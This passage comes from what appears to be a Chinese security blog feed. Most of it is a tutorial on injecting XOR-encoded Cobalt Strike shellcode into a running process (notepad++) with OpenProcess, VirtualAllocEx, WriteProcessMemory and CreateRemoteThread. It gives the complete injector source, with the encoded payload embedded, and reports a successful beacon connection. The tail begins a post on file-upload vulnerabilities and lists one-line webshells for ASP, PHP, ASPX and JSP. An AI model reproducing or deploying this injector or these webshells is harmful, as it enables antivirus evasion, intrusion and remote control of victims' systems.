x13\x55\xb1\xd5\x13\x41\xbf\x18\xac\x3\x6e\x6a\xc1\xb9\x2a\x14\x61\x1e\xe1\xa0\xfc\xb2\xb5\x48\x88\x74\x14\xb1\xad\x7f\xca\xc8\x45\xe1\x53\xc9\x3\x56\xd1\xec\xc\xd5\xb2\x61\xc5\xa5\x9c\xa1\xb6\xd9\xed\xc7\xee\xe0\xf5\x36\x1b\x8e\xb0\xbc\x9\xcc\x2\xd\xf9\x69\xe2\xaf\xa2\xfd\x77\x46\xa8\x9b\x5\x49\xc4\x29\xaf\x8\x2c\x1\x69\xf1\xb4\xa3\x57\xfe\xd4\x6b\x41\x69\x1\x11\x1\x1\x69\x1\x1\x41\x1\x56\x69\x59\xa5\x52\xe4\xfe\xd4\x92\xb8\x29\x1\x1\x1\x0\xd8\x50\x52\x88\xe6\x56\x69\x1\x21\x1\x1\x52\x57\x69\x13\x97\x88\xe3\xfe\xd4\x84\xc1\x75\xc7\x8a\x6\x0\xc2\x84\xc1\x74\xe4\x59\xc2\xe9\xa8\xfc\xfe\xfe\x32\x37\x2f\x30\x31\x30\x2f\x33\x31\x37\x2f\x33\x31\x36\x1\x26\x30\x4a\x58</code></pre><h2 id="0x02-打开进程"><a href="#0x02-打开进程" class="headerlink" title="0x02 打开进程"></a>0x02 打开进程</h2><p>C语言代码如下：</p><pre><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) {    // The PID that you want to use    int process_id = atoi(argv[1]);             // 接收外部传参进来是数字    // Declare a new handle as process variable    // PROCESS_ALL_ACCESS    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);        // 打开id为传参进来数字的进程    DWORD dwWriteBytes;    // If the operation succeeded it will return the handle    if (process) {                                                              // 判断打开进程是否成功        printf(&quot;[+] Handle retrieved successfully!\n &quot;);    }    else {        printf(&quot;[-] Unable to retrieve process handle\n &quot;);    }}</code></pre><p>OpenProcess函数介绍：</p><p>第一个参数设置为PROCESS_ALL_ACCESS，即赋予所有权限</p><p>官方解释：<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</a></p><p><img src="/img/ShellcodeInject/e1bb56c0-8a20-4f94-a16e-28398f5e872f.png" alt="img"></p><p>第二个参数为True or False，即创建的进程是否继承的意思</p><p>第三个参数为要打开的进程id</p><p>官方demo：<a href="https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes</a></p><p>编译好后运行，这里选择注入notepad++进程</p><p><img src="/img/ShellcodeInject/047738cd-5eaf-4f2d-89f8-83e923f3caff.png" alt="img"></p><p>说明进程打开成功</p><p><img src="/img/ShellcodeInject/bdb05bbd-f0cf-4745-8cc8-a71ae59e100f.png" alt="img"></p><h2 id="0x03-开辟内存"><a href="#0x03-开辟内存" class="headerlink" title="0x03 开辟内存"></a>0x03 开辟内存</h2><pre><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) {    unsigned char data[] = &quot;\xfd\xe9\x88\x1\x1\x1\x61\x88\xe4\x30\xd3\x65\x8a\x53\x31\x8a\x53\xd\x8a\x53\x15\x8a\x73\x29\xe\xb6\x4b\x27\x30\xfe\x30\xc1\xad\x3d\x60\x7d\x3\x2d\x21\xc0\xce\xc\x0\xc6\xe3\xf1\x53\x56\x8a\x53\x11\x8a\x43\x3d\x0\xd1\x8a\x41\x79\x84\xc1\x75\x4b\x0\xd1\x51\x8a\x49\x19\x8a\x59\x21\x0\xd2\xe2\x3d\x48\x8a\x35\x8a\x0\xd7\x30\xfe\x30\xc1\xad\xc0\xce\xc\x0\xc6\x39\xe1\x74\xf5\x2\x7c\xf9\x3a\x7c\x25\x74\xe3\x59\x8a\x59\x25\x0\xd2\x67\x8a\xd\x4a\x8a\x59\x1d\x0\xd2\x8a\x5\x8a\x0\xd1\x88\x45\x25\x25\x5a\x5a\x60\x58\x5b\x50\xfe\xe1\x59\x5e\x5b\x8a\x13\xea\x87\x5c\x69\x6f\x64\x75\x1\x69\x76\x68\x6f\x68\x55\x69\x4d\x76\x27\x6\xfe\xd4\x30\xfe\x56\x56\x56\x56\x56\x69\x3b\x57\x78\xa6\xfe\xd4\xe8\x85\x1\x1\x1\x5a\x30\xc8\x50\x50\x6b\x2\x50\x50\x69\x51\x1\x1\x1\x52\x51\x69\x56\x88\x9e\xc7\xfe\xd4\xea\x71\x5a\x30\xd3\x53\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\x7e\xc5\x82\x7\xe7\x94\xd7\x24\x3e\x70\xae\xc\x8e\x30\xbc\xb9\x8d\xad\xe1\xb1\xdd\xcf\xb5\xca\xc3\x81\x6e\xb4\xe6\xe4\xd3\x25\x7\x1c\x87\xd1\xc8\x8a\x61\x46\x40\x8d\x5c\xd8\x63\xc3\x41\xb5\x4e\x9e\x49\x32\x58\x89\xae\x44\x1\x49\x6e\x72\x75\x3b\x21\x6d\x6e\x66\x68\x2f\x60\x6d\x68\x78\x74\x6f\x65\x73\x68\x77\x64\x2f\x62\x6e\x6c\xc\xb\x42\x6e\x6e\x6a\x68\x64\x3b\x21\x50\x68\x49\x6e\x6e\x46\x54\x48\x45\x3c\x42\x38\x47\x40\x37\x35\x32\x33\x40\x47\x36\x34\x2f\x30\x34\x36\x32\x32\x36\x32\x35\x30\x33\x30\x33\x36\x3a\xc\xb\x54\x72\x64\x73\x2c\x40\x66\x64\x6f\x75\x3b\x21\x4c\x6e\x7b\x68\x6d\x6d\x60\x2e\x34\x2f\x31\x21\x29\x4d\x68\x6f\x74\x79\x3a\x21\x40\x6f\x65\x73\x6e\x68\x65\x21\x35\x2f\x30\x2f\x30\x3a\x21\x4f\x64\x79\x74\x72\x21\x36\x21\x43\x74\x68\x6d\x65\x2e\x4b\x53\x4e\x31\x32\x45\x28\x21\x40\x71\x71\x6d\x64\x56\x64\x63\x4a\x68\x75\x2e\x34\x32\x34\x2f\x30\x38\x21\x29\x4a\x49\x55\x4c\x4d\x2d\x21\x6d\x68\x6a\x64\x21\x46\x64\x62\x6a\x6e\x28\xc\xb\x1\x5\x26\xd5\x1e\x4a\x1d\x40\xc3\x44\x73\xa9\xe9\xb4\x73\x58\xc5\xb\x5a\x9f\xa3\xa2\x2a\x9d\xdc\x1f\x7a\x9e\xfc\x88\xd1\xd5\x38\x69\xc\x2\x25\xd9\x13\x55\xb1\xd5\x13\x41\xbf\x18\xac\x3\x6e\x6a\xc1\xb9\x2a\x14\x61\x1e\xe1\xa0\xfc\xb2\xb5\x48\x88\x74\x14\xb1\xad\x7f\xca\xc8\x45\xe1\x53\xc9\x3\x56\xd1\xec\xc\xd5\xb2\x61\xc5\xa5\x9c\xa1\xb6\xd9\xed\xc7\xee\xe0\xf5\x36\x1b\x8e\xb0\xbc\x9\xcc\x2\xd\xf9\x69\xe2\xaf\xa2\xfd\x77\x46\xa8\x9b\x5\x49\xc4\x29\xaf\x8\x2c\x1\x69\xf1\xb4\xa3\x57\xfe\xd4\x6b\x41\x69\x1\x11\x1\x1\x69\x1\x1\x41\x1\x56\x69\x59\xa5\x52\xe4\xfe\xd4\x92\xb8\x29\x1\x1\x1\x0\xd8\x50\x52\x88\xe6\x56\x69\x1\x21\x1\x1\x52\x57\x69\x13\x97\x88\xe3\xfe\xd4\x84\xc1\x75\xc7\x8a\x6\x0\xc2\x84\xc1\x74\xe4\x59\xc2\xe9\xa8\xfc\xfe\xfe\x32\x37\x2f\x30\x31\x30\x2f\x33\x31\x37\x2f\x33\x31\x36\x1\x26\x30\x4a\x58&quot;;    // The PID that you want to use    int process_id = atoi(argv[1]);                 // 接收外部传参进来是数字    // Declare a new handle as process variable    // PROCESS_ALL_ACCESS    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);            // 打开id为传参进来数字的进程    DWORD dwWriteBytes;    // If the operation succeeded it will return the handle    if (process) {                                                                      // 判断打开进程是否成功        printf(&quot;[+] Handle retrieved successfully!\n &quot;);        // We can print it as pointer using printf        printf(&quot;[+] Handle value is % p\n &quot;, process);        LPVOID base_address;        base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);       // 开辟内存        if (base_address) {            printf(&quot;[+] Allocated based address is 0x %p\n &quot;, base_address);        }        else {            printf(&quot;[-] Unable to allocate memory ...\n&quot;);        }    }    else {        printf(&quot;[-] Unable to retrieve process handle\n &quot;);    }}</code></pre><p>VirtualAllocEx函数介绍</p><pre><code>VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);       // 开辟内存LPVOID VirtualAllocEx(  HANDLE hProcess,                  // OpenProcess函数的调用返回的进程句柄  LPVOID lpAddress,                 // 参数为NULL，则系统自动分配  DWORD dwSize,                     // 要开辟的内存数据大小  DWORD flAllocationType,  DWORD flProtect                   // 赋予该内存地址读写执行权限（RWX）);官方解释：https://docs.microsoft.com/en-us/previous-versions/aa909179(v=msdn.10)</code></pre><p>参数flAllocationType和flProtect的值如下：</p><p>官方解释：<a href="https://docs.microsoft.com/en-us/previous-versions/aa908768(v=msdn.10)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/aa908768(v=msdn.10)</a></p><p><img src="/img/ShellcodeInject/26da450a-96e9-4268-b7b8-08c30f8ac809.png" alt="img"></p><p><img src="/img/ShellcodeInject/40f790ed-ab28-4815-8070-f3d2b046480f.png" alt="img"></p><p>编译后运行，注意返回来的地址，这是开辟内存的起始地址</p><p><img src="/img/ShellcodeInject/6221d23d-6928-4b8f-bab2-e40dff410cea.png" alt="img"></p><p>通过dbg查看，选择附加</p><p><img src="/img/ShellcodeInject/4eade3c4-6fce-42a3-8c52-4065cd03876e.png" alt="img"></p><p>将notepad++添加进去</p><p><img src="/img/ShellcodeInject/25f5ba30-998b-46c9-a718-6943d4d3ef53.png" alt="img"></p><p>右键-&gt;转到-&gt;表达式</p><p><img src="/img/ShellcodeInject/34ae0b00-2c07-41f1-998d-9900a89acf10.png" alt="img"></p><p>输入地址</p><p><img src="/img/ShellcodeInject/35a5d3dd-1e64-42b0-819f-b11ff65ff2d1.png" alt="img"></p><p>此时跳到该地址，可以看到开辟了内存空间</p><p><img src="/img/ShellcodeInject/a08187e1-c6bc-4437-a62e-64fe1cd4f780.png" alt="img"></p><p>右键跳到内存布局中</p><p><img src="/img/ShellcodeInject/f3965610-2443-47e4-aa9b-139e5b0a08e5.png" alt="img"></p><p>可以看到是ERW，即执行读取写入权限，符合我们之前设置的参数</p><p><img src="/img/ShellcodeInject/cf03fe15-d270-419a-8dba-7ad3a2000f62.png" alt="img"></p><p>右键跳转到反汇编中</p><p><img src="/img/ShellcodeInject/27534d26-ffdd-48c4-b88f-139496edb39b.png" alt="img"></p><p>从内存中也可以看到开辟了空间，内容都是空，等着写入shellcode</p><p><img src="/img/ShellcodeInject/5f0de65c-fe58-4ac6-8751-0e2af990207b.png" alt="img"></p><h2 id="0x04-写入shellcode"><a href="#0x04-写入shellcode" class="headerlink" title="0x04 写入shellcode"></a>0x04 写入shellcode</h2><pre><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) {    unsigned char data[] = &quot;\xfd\xe9\x88\x1\x1\x1\x61\x88\xe4\x30\xd3\x65\x8a\x53\x31\x8a\x53\xd\x8a\x53\x15\x8a\x73\x29\xe\xb6\x4b\x27\x30\xfe\x30\xc1\xad\x3d\x60\x7d\x3\x2d\x21\xc0\xce\xc\x0\xc6\xe3\xf1\x53\x56\x8a\x53\x11\x8a\x43\x3d\x0\xd1\x8a\x41\x79\x84\xc1\x75\x4b\x0\xd1\x51\x8a\x49\x19\x8a\x59\x21\x0\xd2\xe2\x3d\x48\x8a\x35\x8a\x0\xd7\x30\xfe\x30\xc1\xad\xc0\xce\xc\x0\xc6\x39\xe1\x74\xf5\x2\x7c\xf9\x3a\x7c\x25\x74\xe3\x59\x8a\x59\x25\x0\xd2\x67\x8a\xd\x4a\x8a\x59\x1d\x0\xd2\x8a\x5\x8a\x0\xd1\x88\x45\x25\x25\x5a\x5a\x60\x58\x5b\x50\xfe\xe1\x59\x5e\x5b\x8a\x13\xea\x87\x5c\x69\x6f\x64\x75\x1\x69\x76\x68\x6f\x68\x55\x69\x4d\x76\x27\x6\xfe\xd4\x30\xfe\x56\x56\x56\x56\x56\x69\x3b\x57\x78\xa6\xfe\xd4\xe8\x85\x1\x1\x1\x5a\x30\xc8\x50\x50\x6b\x2\x50\x50\x69\x51\x1\x1\x1\x52\x51\x69\x56\x88\x9e\xc7\xfe\xd4\xea\x71\x5a\x30\xd3\x53\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\x7e\xc5\x82\x7\xe7\x94\xd7\x24\x3e\x70\xae\xc\x8e\x30\xbc\xb9\x8d\xad\xe1\xb1\xdd\xcf\xb5\xca\xc3\x81\x6e\xb4\xe6\xe4\xd3\x25\x7\x1c\x87\xd1\xc8\x8a\x61\x46\x40\x8d\x5c\xd8\x63\xc3\x41\xb5\x4e\x9e\x49\x32\x58\x89\xae\x44\x1\x49\x6e\x72\x75\x3b\x21\x6d\x6e\x66\x68\x2f\x60\x6d\x68\x78\x74\x6f\x65\x73\x68\x77\x64\x2f\x62\x6e\x6c\xc\xb\x42\x6e\x6e\x6a\x68\x64\x3b\x21\x50\x68\x49\x6e\x6e\x46\x54\x48\x45\x3c\x42\x38\x47\x40\x37\x35\x32\x33\x40\x47\x36\x34\x2f\x30\x34\x36\x32\x32\x36\x32\x35\x30\x33\x30\x33\x36\x3a\xc\xb\x54\x72\x64\x73\x2c\x40\x66\x64\x6f\x75\x3b\x21\x4c\x6e\x7b\x68\x6d\x6d\x60\x2e\x34\x2f\x31\x21\x29\x4d\x68\x6f\x74\x79\x3a\x21\x40\x6f\x65\x73\x6e\x68\x65\x21\x35\x2f\x30\x2f\x30\x3a\x21\x4f\x64\x79\x74\x72\x21\x36\x21\x43\x74\x68\x6d\x65\x2e\x4b\x53\x4e\x31\x32\x45\x28\x21\x40\x71\x71\x6d\x64\x56\x64\x63\x4a\x68\x75\x2e\x34\x32\x34\x2f\x30\x38\x21\x29\x4a\x49\x55\x4c\x4d\x2d\x21\x6d\x68\x6a\x64\x21\x46\x64\x62\x6a\x6e\x28\xc\xb\x1\x5\x26\xd5\x1e\x4a\x1d\x40\xc3\x44\x73\xa9\xe9\xb4\x73\x58\xc5\xb\x5a\x9f\xa3\xa2\x2a\x9d\xdc\x1f\x7a\x9e\xfc\x88\xd1\xd5\x38\x69\xc\x2\x25\xd9\x13\x55\xb1\xd5\x13\x41\xbf\x18\xac\x3\x6e\x6a\xc1\xb9\x2a\x14\x61\x1e\xe1\xa0\xfc\xb2\xb5\x48\x88\x74\x14\xb1\xad\x7f\xca\xc8\x45\xe1\x53\xc9\x3\x56\xd1\xec\xc\xd5\xb2\x61\xc5\xa5\x9c\xa1\xb6\xd9\xed\xc7\xee\xe0\xf5\x36\x1b\x8e\xb0\xbc\x9\xcc\x2\xd\xf9\x69\xe2\xaf\xa2\xfd\x77\x46\xa8\x9b\x5\x49\xc4\x29\xaf\x8\x2c\x1\x69\xf1\xb4\xa3\x57\xfe\xd4\x6b\x41\x69\x1\x11\x1\x1\x69\x1\x1\x41\x1\x56\x69\x59\xa5\x52\xe4\xfe\xd4\x92\xb8\x29\x1\x1\x1\x0\xd8\x50\x52\x88\xe6\x56\x69\x1\x21\x1\x1\x52\x57\x69\x13\x97\x88\xe3\xfe\xd4\x84\xc1\x75\xc7\x8a\x6\x0\xc2\x84\xc1\x74\xe4\x59\xc2\xe9\xa8\xfc\xfe\xfe\x32\x37\x2f\x30\x31\x30\x2f\x33\x31\x37\x2f\x33\x31\x36\x1\x26\x30\x4a\x58&quot;;    // The PID that you want to use    int process_id = atoi(argv[1]);                 // 接收外部传参进来是数字    // Declare a new handle as process variable    // PROCESS_ALL_ACCESS    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);            // 打开id为传参进来数字的进程    DWORD dwWriteBytes;    // If the operation succeeded it will return the handle    if (process) {                                                                      // 判断打开进程是否成功        printf(&quot;[+] Handle retrieved successfully!\n &quot;);        // We can print it as pointer using printf        printf(&quot;[+] Handle value is % p\n &quot;, process);        LPVOID base_address;        base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);       // 开辟内存        if (base_address) {            printf(&quot;[+] Allocated based address is 0x %p\n &quot;, base_address);            int i;            // Base address counter            int n = 0;            for (i = 0; i &lt;= sizeof(data); i++) {                // Decode shellcode opcode                char DecodedOpCode = data[i] ^ 0x01;                // 将异或后的字符串异或为shellcdoe                // printf(&quot;%c&quot;, DecodedOpCode);                // Write the decoded bytes in memory address                // 写入内存                if (WriteProcessMemory(process, (LPVOID)((int)base_address + n), &amp;DecodedOpCode, 1, NULL)) {                    printf(&quot;[+] Byte wrote sucessfully!\n&quot;);                    // Increase memory address by 1                    n++;                }            }        }        else {            printf(&quot;[-] Unable to allocate memory ...\n&quot;);        }    }    else {        printf(&quot;[-] Unable to retrieve process handle\n &quot;);    }}</code></pre><p>WriteProcessMemory函数介绍</p><pre><code>WriteProcessMemory(process, (LPVOID)((int)base_address + n), &amp;DecodedOpCode, 1, NULL)BOOL WriteProcessMemory(  HANDLE  hProcess,                 // OpenProcess函数的调用返回的进程句柄  LPVOID  lpBaseAddress,            // 要写入内存的地址，即之前开辟的内存地址  LPCVOID lpBuffer,                 // 要写入的数据  SIZE_T  nSize,                    // 写入数据的大小  SIZE_T  *lpNumberOfBytesWritten   // 设置为NULL即可);官方解释：https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory</code></pre><p>继续编译，然后运行，可以看到往内存地址00D80000写入shellcode</p><p><img src="/img/ShellcodeInject/8dec83a4-8435-4091-8053-85d4f72f6dc0.png" alt="img"></p><p>通过dbg打开看看，的确符合cobalstrike生成的shellcode内容。那么就成功的往notepad++进程中开辟了一个内存，并且将shellcode写入。</p><p><img src="/img/ShellcodeInject/1ad8de90-b571-4d3a-8a16-7357ed143c73.png" alt="img"></p><h2 id="0x05-创建线程执行shellcode，上线到cobaltstrike"><a href="#0x05-创建线程执行shellcode，上线到cobaltstrike" class="headerlink" title="0x05 创建线程执行shellcode，上线到cobaltstrike"></a>0x05 创建线程执行shellcode，上线到cobaltstrike</h2><pre><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]) {    unsigned char data[] = &quot;\xfd\xe9\x88\x1\x1\x1\x61\x88\xe4\x30\xd3\x65\x8a\x53\x31\x8a\x53\xd\x8a\x53\x15\x8a\x73\x29\xe\xb6\x4b\x27\x30\xfe\x30\xc1\xad\x3d\x60\x7d\x3\x2d\x21\xc0\xce\xc\x0\xc6\xe3\xf1\x53\x56\x8a\x53\x11\x8a\x43\x3d\x0\xd1\x8a\x41\x79\x84\xc1\x75\x4b\x0\xd1\x51\x8a\x49\x19\x8a\x59\x21\x0\xd2\xe2\x3d\x48\x8a\x35\x8a\x0\xd7\x30\xfe\x30\xc1\xad\xc0\xce\xc\x0\xc6\x39\xe1\x74\xf5\x2\x7c\xf9\x3a\x7c\x25\x74\xe3\x59\x8a\x59\x25\x0\xd2\x67\x8a\xd\x4a\x8a\x59\x1d\x0\xd2\x8a\x5\x8a\x0\xd1\x88\x45\x25\x25\x5a\x5a\x60\x58\x5b\x50\xfe\xe1\x59\x5e\x5b\x8a\x13\xea\x87\x5c\x69\x6f\x64\x75\x1\x69\x76\x68\x6f\x68\x55\x69\x4d\x76\x27\x6\xfe\xd4\x30\xfe\x56\x56\x56\x56\x56\x69\x3b\x57\x78\xa6\xfe\xd4\xe8\x85\x1\x1\x1\x5a\x30\xc8\x50\x50\x6b\x2\x50\x50\x69\x51\x1\x1\x1\x52\x51\x69\x56\x88\x9e\xc7\xfe\xd4\xea\x71\x5a\x30\xd3\x53\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\xxx\x7e\xc5\x82\x7\xe7\x94\xd7\x24\x3e\x70\xae\xc\x8e\x30\xbc\xb9\x8d\xad\xe1\xb1\xdd\xcf\xb5\xca\xc3\x81\x6e\xb4\xe6\xe4\xd3\x25\x7\x1c\x87\xd1\xc8\x8a\x61\x46\x40\x8d\x5c\xd8\x63\xc3\x41\xb5\x4e\x9e\x49\x32\x58\x89\xae\x44\x1\x49\x6e\x72\x75\x3b\x21\x6d\x6e\x66\x68\x2f\x60\x6d\x68\x78\x74\x6f\x65\x73\x68\x77\x64\x2f\x62\x6e\x6c\xc\xb\x42\x6e\x6e\x6a\x68\x64\x3b\x21\x50\x68\x49\x6e\x6e\x46\x54\x48\x45\x3c\x42\x38\x47\x40\x37\x35\x32\x33\x40\x47\x36\x34\x2f\x30\x34\x36\x32\x32\x36\x32\x35\x30\x33\x30\x33\x36\x3a\xc\xb\x54\x72\x64\x73\x2c\x40\x66\x64\x6f\x75\x3b\x21\x4c\x6e\x7b\x68\x6d\x6d\x60\x2e\x34\x2f\x31\x21\x29\x4d\x68\x6f\x74\x79\x3a\x21\x40\x6f\x65\x73\x6e\x68\x65\x21\x35\x2f\x30\x2f\x30\x3a\x21\x4f\x64\x79\x74\x72\x21\x36\x21\x43\x74\x68\x6d\x65\x2e\x4b\x53\x4e\x31\x32\x45\x28\x21\x40\x71\x71\x6d\x64\x56\x64\x63\x4a\x68\x75\x2e\x34\x32\x34\x2f\x30\x38\x21\x29\x4a\x49\x55\x4c\x4d\x2d\x21\x6d\x68\x6a\x64\x21\x46\x64\x62\x6a\x6e\x28\xc\xb\x1\x5\x26\xd5\x1e\x4a\x1d\x40\xc3\x44\x73\xa9\xe9\xb4\x73\x58\xc5\xb\x5a\x9f\xa3\xa2\x2a\x9d\xdc\x1f\x7a\x9e\xfc\x88\xd1\xd5\x38\x69\xc\x2\x25\xd9\x13\x55\xb1\xd5\x13\x41\xbf\x18\xac\x3\x6e\x6a\xc1\xb9\x2a\x14\x61\x1e\xe1\xa0\xfc\xb2\xb5\x48\x88\x74\x14\xb1\xad\x7f\xca\xc8\x45\xe1\x53\xc9\x3\x56\xd1\xec\xc\xd5\xb2\x61\xc5\xa5\x9c\xa1\xb6\xd9\xed\xc7\xee\xe0\xf5\x36\x1b\x8e\xb0\xbc\x9\xcc\x2\xd\xf9\x69\xe2\xaf\xa2\xfd\x77\x46\xa8\x9b\x5\x49\xc4\x29\xaf\x8\x2c\x1\x69\xf1\xb4\xa3\x57\xfe\xd4\x6b\x41\x69\x1\x11\x1\x1\x69\x1\x1\x41\x1\x56\x69\x59\xa5\x52\xe4\xfe\xd4\x92\xb8\x29\x1\x1\x1\x0\xd8\x50\x52\x88\xe6\x56\x69\x1\x21\x1\x1\x52\x57\x69\x13\x97\x88\xe3\xfe\xd4\x84\xc1\x75\xc7\x8a\x6\x0\xc2\x84\xc1\x74\xe4\x59\xc2\xe9\xa8\xfc\xfe\xfe\x32\x37\x2f\x30\x31\x30\x2f\x33\x31\x37\x2f\x33\x31\x36\x1\x26\x30\x4a\x58&quot;;    // The PID that you want to use    int process_id = atoi(argv[1]);                 // 接收外部传参进来是数字    // Declare a new handle as process variable    // PROCESS_ALL_ACCESS    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);            // 打开id为传参进来数字的进程    DWORD dwWriteBytes;    // If the operation succeeded it will return the handle    if (process) {                                                                      // 判断打开进程是否成功        printf(&quot;[+] Handle retrieved successfully!\n &quot;);        // We can print it as pointer using printf        printf(&quot;[+] Handle value is % p\n &quot;, process);        LPVOID base_address;        base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);       // 开辟内存        if (base_address) {            printf(&quot;[+] Allocated based address is 0x %p\n &quot;, base_address);            int i;            // Base address counter            int n = 0;            for (i = 0; i &lt;= sizeof(data); i++) {                // Decode shellcode opcode                char DecodedOpCode = data[i] ^ 0x01;                // 将异或后的字符串异或为shellcdoe                // printf(&quot;%c&quot;, DecodedOpCode);                // Write the decoded bytes in memory address                // 写入内存                if (WriteProcessMemory(process, (LPVOID)((int)base_address + n), &amp;DecodedOpCode, 1, NULL)) {                    printf(&quot;[+] Byte wrote sucessfully!\n&quot;);                    // Increase memory address by 1                    n++;                }            }            // 创建线程            HANDLE hRemoteThread = CreateRemoteThread(process, NULL, 100, (LPTHREAD_START_ROUTINE)base_address, NULL, 0, &amp;dwWriteBytes);            if (!hRemoteThread) {                printf(&quot;Create remote thread failed : %s&quot;, GetLastError());                return -1;            }        }        else {            printf(&quot;[-] Unable to allocate memory ...\n&quot;);        }    }    else {        printf(&quot;[-] Unable to retrieve process handle\n &quot;);    }}</code></pre><p>CreateRemoteThread函数介绍</p><pre><code>CreateRemoteThread(process, NULL, 100, (LPTHREAD_START_ROUTINE)base_address, NULL, 0, &amp;dwWriteBytes);BOOL WriteProcessMemory(  HANDLE  hProcess,                 // OpenProcess函数的调用返回的进程句柄  LPVOID  lpBaseAddress,            // 要写入内存的地址，即之前开辟的内存地址  LPCVOID lpBuffer,                 // 要写入的数据  SIZE_T  nSize,                    // 写入数据的大小  SIZE_T  *lpNumberOfBytesWritten   // 设置为NULL即可);HANDLE CreateRemoteThread(  HANDLE                 hProcess,                      // OpenProcess函数的调用返回的进程句柄  LPSECURITY_ATTRIBUTES  lpThreadAttributes,            // NULL使用默认的安全描述符  SIZE_T                 dwStackSize,                   // 堆栈的初始大小  LPTHREAD_START_ROUTINE lpStartAddress,                // 开辟内存的起始地址  LPVOID                 lpParameter,                   // NULL即可  DWORD                  dwCreationFlags,               // 0表示在线程创建后立即运行  LPDWORD                lpThreadId                     // 指向接收线程的变量的指针，也可以为NULL);官方解释：https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread</code></pre><p>编译后运行</p><p><img src="/img/ShellcodeInject/0f05f43a-484e-4e4e-8e15-99154316b352.png" alt="img"></p><p>成功上线</p><p><img src="/img/ShellcodeInject/7b2fdeb2-1d86-47e7-a79e-22c2b17e79b4.png" alt="img"></p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><pre><code>https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/</code></pre>]]></content>
      
      
      <categories>
          
          <category> Shellcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shellcode进程注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>上传漏洞</title>
      <link href="/2021/02/19/shang-chuan-lou-dong/"/>
      <url>/2021/02/19/shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><h2 id="0x01-概要说明"><a href="#0x01-概要说明" class="headerlink" title="0x01 概要说明"></a>0x01 概要说明</h2><p><strong>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。</strong></p><pre><code>Asp一句话：&lt;%eval request(&quot;kkk&quot;)%&gt;            kkkPhp 一句话：&lt;?php eval($_POST[666]);?&gt;         666Aspx一句话：&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;111&quot;],&quot;unsafe&quot;);%&gt;            111Jsp一句话：            cat&lt;%  if(request.getParameter(&quot;cat&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\&quot;)+request.getParameter(&quot;cat&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());  %&gt;</code></pre><h2 id="0x02-服务端的上传验证"><a href="#0x02-服务端的上传验证" class="headerlink" title="0x02 服务端的上传验证"></a>0x02 服务端的上传验证</h2><p><strong>1   白名单验证         